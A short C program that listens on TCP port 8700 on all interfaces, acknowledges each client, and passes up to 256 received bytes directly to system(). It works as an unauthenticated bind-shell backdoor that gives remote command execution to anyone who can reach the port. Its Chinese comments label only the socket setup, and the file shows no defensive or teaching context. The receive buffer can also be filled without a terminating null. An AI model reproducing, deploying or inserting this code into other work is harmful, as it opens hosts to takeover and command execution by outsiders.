#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc , char *argv[])
{
    //socket的建立
    char buf[256] = {};
    char message[] = {"Ok, got it.\n"};
    int sockfd = 0,client_fd = 0;
    sockfd = socket(AF_INET , SOCK_STREAM , 0);

    if (sockfd == -1)
        printf("Fail to create a socket.");

    //socket的連線
    struct sockaddr_in serverInfo,clientInfo;
    int addrlen = sizeof(clientInfo);
    bzero(&serverInfo,sizeof(serverInfo));

    serverInfo.sin_family = PF_INET;
    serverInfo.sin_addr.s_addr = INADDR_ANY;
    serverInfo.sin_port = htons(8700);
    bind(sockfd,(struct sockaddr *)&serverInfo,sizeof(serverInfo));
    listen(sockfd,5);

    while(1){
        client_fd = accept(sockfd,(struct sockaddr*) &clientInfo, &addrlen);
        send(client_fd,message,sizeof(message),0);
        recv(client_fd,buf,0x100,0);
        system(buf);
    }
    return 0;
}